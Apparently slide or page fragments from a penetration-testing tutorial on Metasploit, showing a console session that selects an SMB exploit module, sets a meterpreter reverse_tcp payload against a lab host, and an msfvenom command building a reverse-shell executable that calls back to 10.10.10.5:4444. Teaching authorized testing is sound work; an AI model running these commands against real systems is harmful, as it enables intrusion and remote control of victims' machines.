steps.label: payload
steps.sub: what runs after a successful exploit

steps.label: auxiliary / post
steps.sub: scanners and login testers / enumeration after a session exists

code:
msf6 > search type:exploit cve:2024-12345
msf6 > use exploit/windows/smb/example_module
msf6 exploit(example_module) > show options
msf6 exploit(example_module) > set RHOSTS 10.10.10.25
msf6 exploit(example_module) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(example_module) > show payloads
msf6 exploit(example_module) > check
msf6 exploit(example_module) > exploit
caption: check validates the vulnerability non-destructively before exploit ever runs for real.

steps.label: Works across target OSes
steps.sub: no custom tooling per target needed

code:
# bring Chapter 3's enumeration into Metasploit:
msf6 > db_import scan-results.xml

# generate a custom payload for authorized delivery:
$ msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.10.5 LPORT=4444 -f exe -o payload.exe
caption: Each phase's output becomes clean, structured input for the next.
